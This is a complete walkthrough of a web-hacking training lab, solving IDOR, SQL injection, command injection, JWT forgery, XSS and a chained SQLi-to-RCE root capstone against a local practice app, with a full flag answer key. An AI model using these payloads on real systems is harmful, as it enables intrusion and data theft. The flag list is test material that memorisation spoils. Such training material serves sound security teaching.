# webhacking101 - Full Walkthrough

Step-by-step solutions for every lab, start to finish. Try each one yourself first;
this is here for when you are stuck or want to check your work.

Everything runs in your browser. Your environment:

- Menu of everything: **/labs**
- Warm-up labs: **/lab00** to **/lab09**
- Full target app: **/**  (login `student / hunter2`)
- Your own shell in a browser tab: **/term**

Each lab prints, on the page, the request you sent and what the server did with it.
Read that panel, change one thing, submit again. When you solve a lab the page turns
green and shows a SOLVED banner.

A few labs need one line typed in **/term** (your in-browser shell). Those are marked.

---

# Part 1 - Warm-up labs

Nine focused labs, one bug each. Do these first.

## Lab 00 - IDOR (plain id)

**Goal:** read a staff record that is not yours.

1. Open **/lab00**. You are employee `#1002`, and you see your own record.
2. Look at the URL: `/lab00/?id=1002`. The id is just a number.
3. Change it to a neighbour: **`/lab00/?id=1001`**
4. The page shows employee 1001's record (a.reyes) and the flag.

**Flag:** `flag{indiv_id0r_1nt}`
**Why:** the app returns whatever id you ask for and never checks the record is yours.

## Lab 01 - IDOR (base64 id)

**Goal:** same bug, but the id is hidden in base64.

1. Open **/lab01**. Your doc id is `MTAwMg==`. The panel shows it decodes to `1002`.
2. You want a neighbour, `1001`. Encode it: `1001` in base64 is **`MTAwMQ==`**.
   (In /term: `printf 1001 | base64`)
3. Open **`/lab01/?doc=MTAwMQ==`**.
4. You get invoice 1001, which is not yours, and the flag. (Try `1000`, `1003` too.)

**Flag:** `flag{indiv_id0r_b64}`
**Why:** encoding is not security. Decode, change, re-encode.

## Lab 02 - SQL injection (login bypass)

**Goal:** log in with no valid password.

1. Open **/lab02**. It is an operator login form.
2. In **both** fields, enter:  `' OR 'a'='a`
3. Submit. You are logged in and the flag appears.

The panel shows the query it built:
```
SELECT callsign, flag FROM operators
WHERE callsign='' OR 'a'='a' AND pin='' OR 'a'='a'
```
Your quote closes the string, and `'a'='a'` is always true, so the WHERE passes.

**Flag:** `flag{indiv_sql1_l0gin_t4ut0logy}`

## Lab 03 - SQL injection (UNION extraction)

**Goal:** read a secret from a different table.

1. Open **/lab03** (a ticket search). The query returns 2 columns.
2. Confirm the column count with:  `' UNION SELECT 1,2-- `  (note the trailing space)
   The page prints `1 | 2`.
3. Ask the database what tables exist:
   `' UNION SELECT name, sql FROM sqlite_master-- `
   You will see a `users` table with columns `username, secret`.
4. Read it:  **`' UNION SELECT username, secret FROM users-- `**
5. The admin's secret (the flag) shows in the results.

**Flag:** `flag{indiv_uni0n_3xtr4ct}`
**Why:** UNION appends a second query's rows. Match the column count, put your data
in a column the page prints.

## Lab 04 - Command injection

**Goal:** run your own command and read the flag file.

1. Open **/lab04** (a DNS lookup tool). This lab strips `|` and `&` but allows `;`.
2. List the folder first:  `example.com; ls`
   You will see `flag.txt` in the working directory.
3. Read it:  **`example.com; cat flag.txt`**

**Flag:** `flag{indiv_cmd1_dns_t00l}`
**Why:** your input is dropped into a shell command; `;` starts a new command.

## Lab 05 - JWT auth bypass

**Goal:** become admin by editing a token.

1. Open **/lab05**. You are given a token whose claim is `{"user":"viewer","is_admin":false}`.
2. Build a new payload with `is_admin` true. In **/term**:
   ```
   printf '%s' '{"user":"viewer","is_admin":true}' | base64 | tr '+/' '-_' | tr -d '='
   ```
   You also need the header, once:
   ```
   printf '%s' '{"alg":"HS256","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
   ```
3. Paste a token as **`header.newpayload.anything`** into the form and submit.
   The signature is never checked, so the third part can be any text.
4. The API greets you as admin and shows the flag.

**Flag:** `flag{indiv_jwt_n0_verify}`
**Why:** the server trusts the claims without verifying the signature.

## Lab 06 - Blind SQL injection (hex-encoded)

**Goal:** read a flag from a hidden `vault` table. Same UNION idea, but your input is
hex-encoded and the result is blind (the panel shows you the query it built).

1. Open **/lab06**. The query has 3 columns; the middle one is shown back to you.
2. Your payload is:  `' UNION SELECT 'a',(SELECT flag FROM vault),'b'-- `
3. Hex-encode it in **/term**:
   ```
   printf "%s" "' UNION SELECT 'a',(SELECT flag FROM vault),'b'-- " | xxd -p | tr -d '\n'
   ```
   or paste this ready-made value:
   ```
   2720554e494f4e2053454c454354202761272c2853454c45435420666c61672046524f4d207661756c74292c2762272d2d20
   ```
4. Open **`/lab06/?t=<that hex>`**. The flag appears as the "plan".

**Flag:** `flag{indiv_wh1tebox_h3x}`

## Lab 07 - Command injection (quote break-out)

**Goal:** run your own command. Your input sits inside single quotes; `$` and backtick
are stripped, but `;` and quotes work.

1. Open **/lab07** (an archive builder).
2. List the folder:  `x'; ls; echo '`  (you will see `flag.txt`)
3. Read it:  **`x'; cat flag.txt; echo '`**

The pattern is: `x'` closes the quote, your commands run, `; echo '` reopens a quote
so the rest of the original command stays valid.

**Flag:** `flag{indiv_wh1tebox_rce_qu0te}`

## Lab 09 - Reflected XSS  (optional)

**Goal:** run JavaScript in the page, then read the flag from the cookie.

1. Open **/lab09** (a knowledge-base search). `<script>` is filtered, so use a handler
   on another tag.
2. Search for:  **`<img src=x onerror=alert(document.cookie)>`**
3. The image fails to load, `onerror` fires, and the alert shows the `lab_flag` cookie.

**Flag:** `flag{indiv_r3fl3ct3d_xss}`
**Why:** your input is written into the page unescaped, so the browser runs it.

---

# Part 2 - Main app: BackHaul UDB

The full product, at **/**. Log in with `student / hunter2`. These reuse the same
skills as the warm-ups; the wrinkles are a little harder. The API challenges (5, 6, 7,
8) are easiest to drive from **/term** with `curl`, shown below.

First, set up a shell in **/term** (optional helpers):
```
J=/tmp/jar
b64(){    printf '%s' "$1" | base64 | tr -d '\n'; }
b64u(){   printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '=\n'; }
curl -s -c $J -b $J http://localhost/app/login.php --data 'username=student&password=hunter2' >/dev/null
```
(From your own machine, replace `http://localhost` with your lab URL.)

## Challenge 1 - IDOR

1. Log in at **/app/login.php** (`student / hunter2`).
2. Your account is record **BH-7C19**. The export view takes a numeric `id`, but
   `/app/export.php?id=5` returns **403** (that is a guarded decoy, on purpose).
3. The real hole is the `ref` parameter. Enumerate the scheme:
   open **`/app/export.php?ref=BH-7C23`** (the admin's record).
4. The admin record and the flag appear. `/app/print.php?ref=BH-7C23` works too.

**Flag:** `flag{id0r_brok3n_4ccess_c0ntrol_pwn}`
**Lesson:** the obvious door (numeric id) is locked; a sibling parameter is not.

## Challenge 2 - SQL injection (login bypass)

1. Open the legacy portal at **/sqli/**.
2. Username:  `' OR 1=1 -- -`   Password: anything.
3. Submit. You are in, and the flag shows.

**Flag:** `flag{sql1_l0gin_byp4ss_tr4iling_sp4ce}`
**Gotcha:** this is MySQL, where the `--` comment needs a trailing space, so use
`-- -`. `admin' -- -` also works.

## Challenge 3 - SQL injection (backup search)

1. Logged in, open **/app/search.php**.
2. In the owner field:  `' OR '1'='1`
3. The search returns every job, including the admin's, whose note is the flag.

**Flag:** `flag{sql1_s3arch_uni0n_dump_3z}`
**Note:** this search user is scoped to one table, so you cannot reach `accounts`
from here. That is Challenge 6's job.

## Challenge 4 - Command injection

1. Open the diagnostics tool at **/cmdi/**.
2. Your input goes inside double quotes and `;` is filtered, so close the quote and
   use a pipe:
   **`8.8.8.8" | cat /opt/flags/cmdi.txt #`**
3. The flag prints in the output.

**Flag:** `flag{cmd1_inj3ction_then_a_r3verse_sh3ll}`
**Gotcha:** a bare `; cat ...` fails twice over (inside quotes, and `;` stripped). Close
the quote, switch to `|`.

## Challenge 5 - JWT auth bypass

In **/term**:
```
H=$(b64u '{"alg":"none"}')
P=$(b64u '{"sub":1,"username":"x","role":"admin"}')
curl -s http://localhost/app/api/me.php -H "Authorization: Bearer $H.$P."
```
The trailing dot matters (empty signature). The API returns the flag.

**Flag:** `flag{jwt_alg_n0ne_c4se_byp4ss}`
**Lesson:** the verifier accepts `alg:none`. The admin check reads the `role` claim.

## Challenge 6 - Whitebox UNION SQLi (forge an admin token)

The token endpoint base64-decodes your input, filters the bare word `UNION`, and the
query has 4 columns with the role in the 3rd. The response is blind.

In **/term**:
```
UN=$(b64 "' UNION/**/SELECT 1,2,'admin',4-- -")
curl -s http://localhost/app/api/token.php --data-urlencode "auth=$UN"
```
The reply is `{"token":"tok_...","role":"admin"}`. Save that token; it is the key to
Challenge 7.
```
ADMTOK=$(curl -s http://localhost/app/api/token.php --data-urlencode "auth=$UN" \
         | sed -n 's/.*"token": *"\([^"]*\)".*/\1/p')
```
**Payoff:** an admin bearer token (there is no flag string here).
**Gotchas:** base64 first, `UNION/**/SELECT` to dodge the filter, 4 columns with
`admin` in the 3rd.

## Challenge 7 - Whitebox RCE (admin token required)

The restore endpoint strips whitespace and `;` and wraps your input with a trailing
`end`, so use command substitution: no `;`, spaces via `${IFS}`, and `#` to comment
out the `end`. Output is swallowed, so copy the flag into the web root and open it.

In **/term** (uses `$ADMTOK` from Challenge 6):
```
curl -s http://localhost/app/api/restore.php -H "Authorization: Bearer $ADMTOK" \
  -H 'Content-Type: application/json' \
  --data '{"target":"$(cp${IFS}/opt/flags/rce.txt${IFS}/var/www/html/loot.txt)#"}'
```
Then open **`/loot.txt`** in your browser.

**Flag:** `flag{wh1tebox_rce_str4ce_n0_sp4ces}`

## Challenge 8 - Capstone (chain to root)

Same technique as Challenge 7, but read the root flag. This is the whole chain:
Challenge 6 gave you `$ADMTOK`; now drive the RCE to grab the root flag.

In **/term**:
```
curl -s http://localhost/app/api/restore.php -H "Authorization: Bearer $ADMTOK" \
  -H 'Content-Type: application/json' \
  --data '{"target":"$(cp${IFS}/opt/flags/root.txt${IFS}/var/www/html/root.txt)#"}'
```
Then open **`/root.txt`**.

**Flag:** `flag{r00t_chain_sql1_to_rce_pwn3d}`
**Lesson:** every link depended on a detail you saw at runtime (the base64 wrapper,
the role column, the whitespace strip and the `end` token). A non-admin token is
rejected here, so Challenge 6 was required.

## Challenge 9 - Stored XSS  (optional)

1. Logged in, open **/app/profile.php**.
2. Set your display name to:
   **`"><details open ontoggle=alert(document.domain)>`**
   `<script>`, `onload`, and `onerror` are all filtered, but `ontoggle` is not.
3. Save. Your name is stored and rendered unescaped, so the payload runs. When an
   admin opens **/app/admin/users.php**, it runs in their browser too. Escalate by
   reading their token from `localStorage['bh_jwt']`.

**Success:** JavaScript executes (there is no flag string; the prize is the admin JWT).
**Reset your name to `student` when done.**

## Challenge 10 - Session fixation  (optional)

1. Grab a real, server-shaped session id from a fresh visit to **/app/login.php**
   (the cookie looks like `bh_sid=s_<32 hex>`).
2. Plant that exact id, log in as the victim on it, and reuse it. The id never
   rotates on login, so the pre-set session is now authenticated.

**Success:** the planted session is authenticated (mechanism lab, no flag string).
**Gotcha:** a random made-up id is rejected; you must lift a real server-shaped one first.

---

# Flags summary

Warm-up labs:
```
lab00  flag{indiv_id0r_1nt}
lab01  flag{indiv_id0r_b64}
lab02  flag{indiv_sql1_l0gin_t4ut0logy}
lab03  flag{indiv_uni0n_3xtr4ct}
lab04  flag{indiv_cmd1_dns_t00l}
lab05  flag{indiv_jwt_n0_verify}
lab06  flag{indiv_wh1tebox_h3x}
lab07  flag{indiv_wh1tebox_rce_qu0te}
lab09  flag{indiv_r3fl3ct3d_xss}   (shown in the cookie via the alert)
```

Main app (BackHaul UDB):
```
Ch1   flag{id0r_brok3n_4ccess_c0ntrol_pwn}
Ch2   flag{sql1_l0gin_byp4ss_tr4iling_sp4ce}
Ch3   flag{sql1_s3arch_uni0n_dump_3z}
Ch4   flag{cmd1_inj3ction_then_a_r3verse_sh3ll}
Ch5   flag{jwt_alg_n0ne_c4se_byp4ss}
Ch6   (admin bearer token, no flag string)
Ch7   flag{wh1tebox_rce_str4ce_n0_sp4ces}
Ch8   flag{r00t_chain_sql1_to_rce_pwn3d}
Ch9   (JavaScript execution, no flag string)
Ch10  (authenticated planted session, no flag string)
```

Seven capturable flags in the main app, nine in the warm-ups.
The app will tell you what it did. Read the panel, change one thing, send it again.
